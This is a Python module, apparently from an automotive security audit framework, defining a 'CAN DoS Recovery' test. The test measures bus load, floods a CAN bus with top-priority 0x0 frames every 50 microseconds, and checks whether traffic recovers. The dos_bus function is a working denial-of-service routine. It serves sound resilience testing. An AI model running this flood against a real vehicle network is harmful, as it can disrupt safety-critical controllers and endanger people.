# SPDX-License-Identifier: GPL-2.0-only
# Copyright (C) 2024-2026 Block Harbor Cybersecurity LLC

from framework import *


def measure_load(bus, baud, log, timeout=3):
    import time

    recv_bits = 0
    time_start = time.time()

    # assuming worst case bit stuffing
    while time.time() < (time_start + timeout):
        msg = bus.recv(0.1)
        if not msg:
            continue
        if msg.is_extended_id:
            recv_bits = recv_bits + 25
        recv_bits = recv_bits + 55 + len(msg.data) * 10

    load = recv_bits * 100 / int(baud) / timeout
    log.info(f"CAN bus using about {load:.2f}% capacity")
    return load


def dos_bus(bus, timeout=3):
    import can
    import time

    msg = can.Message(
        arbitration_id=0x0,
        data=[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF],
        is_extended_id=False,
    )
    bus.send_periodic(msg, 0.00005, timeout)
    time.sleep(timeout + 1)


@register_audit("can_dos")
class can_dos(AuditRunner):
    parameters = [
        Parameter("device", "CAN Interface", "can0", "The network interface on which to interact with the CAN Bus"),
        Parameter("baud", "Baud Rate", "500000", "The baud rate of the CAN network (e.g. 125000, 250000, 500000, 1000000)"),
    ]
    dependencies = ['python-can']
    friendly_name = "CAN DoS Recovery"
    description = "Measures the load of a CAN bus, then proceeds to DoS the network preventing communication and causing errors. A few seconds later, the bus load is measured again to ensure that the network has returned to a normal state."
    fail_condition = "If the bus load at this time is vastly different from the control measurement, this test will be marked as failed."
    relevant_mitigations = ["M15", "M13"]
    relevant_interfaces = ["CAN"]
    bw_audit_id = "TS_CAN_0001"
    estimated_time_in_minutes = "3"
    test_outcomes = {
        "SUCCESS": {
            "description": "The CAN bus load returned to normal after the DoS attack, indicating successful recovery and resilience.",
            "recommendations": []
        },
        "NO_RESPONSE": {
            "description": "The device did not respond to basic queries from the test.",
            "recommendations": [
                "Check physical connections and device power.",
            ]
        },
        "FAILURE": {
            "description": "The CAN bus load did not return to normal after the DoS attack, indicating incomplete or failed recovery.",
            "recommendations": [
                "Investigate error handling and recovery logic.",
                "Review device/network logs for anomalies."
            ]
        }
    }

    def run_audit(self):
        import can
        import time

        device = self.params["device"]
        baud = int(self.params["baud"], 0)

        severity = "n/a"

        bus = can.Bus(interface="socketcan", channel=device)

        before_load = measure_load(bus, baud, self.log)
        time.sleep(3)
        dos_bus(bus)
        time.sleep(3)
        after_load = measure_load(bus, baud, self.log)

        bus.shutdown()
        delta = abs(after_load - before_load)

        if delta > 15:
            severity = "critical"
        elif delta > 10:
            severity = "high"
        elif delta > 8:
            severity = "medium"
        elif delta > 5:
            severity = "low"

        return {
            "before_load": before_load,
            "after_load": after_load,
            "pass_rules": {"vulnerable": (severity != "n/a")},
        }

    def format_results(self, results):
        title = "CAN DoS Recovery"
        segments = []
        if not results["pass_rules"]["vulnerable"]:
            segments.append(
                Report.create_text_segment(
                    f'CAN bus successfully recovered from a DoS. Before DoS bus load: {results["before_load"]}, after DoS bus load: {results["after_load"]}'
                )
            )
        else:
            segments.append(
                Report.create_text_segment(
                    f'CAN bus did not successfully recover from a DoS. Before DoS bus load: {results["before_load"]}, after DoS bus load: {results["after_load"]}'
                )
            )

        return [{"title": title, "segments": segments}]
